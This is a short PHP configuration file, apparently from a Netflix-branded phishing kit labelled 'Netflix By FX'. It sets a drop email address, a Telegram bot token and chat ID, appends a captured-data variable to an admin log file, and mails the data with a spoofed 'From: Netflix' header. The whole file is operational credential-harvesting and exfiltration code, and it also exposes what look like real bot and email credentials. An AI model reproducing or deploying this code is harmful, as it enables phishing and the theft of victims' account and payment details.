<?php

$yourmail  = ' debra1968h@gmail.com ';

$api = "5409590354:AAHx6gDmT3nJzGV9etw2JXhoKYyOT_St3iM";
$chatid ="952307412";


$f = fopen("../admin.php", "a");
	fwrite($f, $msgbank);

$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);



$Our_Name = "Si-FX" ; 

$Name_page = "Netflix By FX" ;



?>